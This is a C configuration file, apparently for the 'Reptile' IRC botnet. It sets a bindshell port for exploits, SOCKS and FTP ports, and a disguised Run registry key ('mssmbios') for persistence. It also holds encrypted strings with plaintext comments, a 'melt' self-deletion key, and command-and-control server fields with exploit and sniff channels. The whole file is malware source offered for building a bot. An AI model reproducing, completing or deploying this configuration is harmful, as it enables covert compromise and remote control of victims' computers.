
char mutexhandle[]		= "gentoo";		//*mutex handle

#ifndef _DEBUG
char botid[]			= "gentoo";		//*bot id
#else
char botid[]			= "gentoo";
#endif

unsigned short ftpdport	= 8082;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 4500;					// socks4 port
unsigned short redirport= 999;					// redirect local port
unsigned short bindport = 4460;					//*bindshell port most of the exploits use

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\rlog.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
#ifndef NO_CRYPT // Encrypted
//--------------------------------------------------------------------------------------------------------
		
	char filename[]			= "";
	/* gentoo.exe */

#ifndef NO_FCONNECT
	char cononstart[]		= "\x4C\x58\x8E\x54\x41\xCD\xF8\x26\xF4\x62\x1A\xC5\x59\x77\xDA\xB8\xDB\x8E\x72\xC2\x83\xB3\xE5\x24\xBF\x3A\xA8\x9E\x9E\x65\x3F\xFF\x99\xB2\x9B";
	/* http://windowsupdate.microsoft.com/ */
#endif

	char version[]			= "\x43\x1C\x9E\x48\x12\x89\xB2\x7F\xAC";
	/* [ Reptile - 0.33 ] */

#ifndef NO_SERVICE
	char servicename[]		= "";
	/* gentoo */
	char servicedisplayname[]= "";
	/* gentoo */
	char servicedesc[]		= "";
	/* gentoo */
#else
	REGENT runkey = { 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run */
		"\x49\x5F\x94\x49\x1C\x91\xF9"
		/* mssmbios */
	};

#endif

	char password[]			= "";
	/*gentoo*/
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char *authost[] = { authhost1 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\x43\x1C\x9E\x48\x12\x89\xB2\x7F\xAC";
	/* [ Reptile - 0.730 ] */
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{   
#ifndef _DEBUG // Live Config
			"",
			/* (server) */
			"",
			/* (server password) */
			6667,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"", /* #gentoo */
			/* (main channel) */
			"",
			/* (channel keyword) */
			"\x09\x54\xD1\x4D",
			/* -x+i (user mode on connect) */
			"",
			/* (channel mode on join) */
			"",
			/* (exploit channel) */
			"",
			/* (sniff channel) */
			""
			/* (warn channel) */
		},
#else // Debug Config DONT NEED TO EDIT THIS UNLESS YOUR USING DEBUG MODE.
			"",
			/* (server) */
			"",
			/* (server password) */
			6667,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"",
			/* (main channel) */
			"",
			/* (channel keyword) */
			"\x09\x54\xD1\x4D",
			/* -x+i (user mode on connect) */
			"",
			/* (channel mode on join) */
			"",
			/* (exploit channel) */
			"",
			/* (sniff channel) */
			""
			/* (warn channel) */
		},
#endif
	};

#ifndef NO_MELT
	REGENT meltkey=	{ 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions */
		"\x69\x49\x96\x50" 
		/* Melt */
	};
#endif
#ifndef NO_RECORD_UPTIME
	REGENT rupkey=	{ 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions */
		"\x76\x49\x99\x4B\x09\x86" 
		/* Record */
	};
#endif
#ifndef NO_INSTALLED_TIME
	REGENT itkey=	{ 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions */
		"\x6D\x42\x89\x50\x1A\x8E\xBB\x34\xF9\x2C\x2A\xC3\x43\x61" 
		/* Installed Time */
	};
#endif

//--------------------------------------------------------------------------------------------------------
#endif
//--------------------------------------------------------------------------------------------------------

char main_title[]		= "(main) ";
char threads_title[]	= "(threads) :";
char process_title[]	= "(proc) ";
char irc_title[]		= "(irc) ";
char sec_title[]		= "(secure) ";
char unsec_title[]		= "(unsecure) ";
char scan_title[]		= "(scan) ";
char ftp_title[]		= "(eftp) ";
char file_title[]		= "(file) ";
char download_title[]	= "(download) ";
char update_title[]		= "(update) ";
char logic_title[]		= "(logic) ";
char reg_title[]		= "(reg) ";
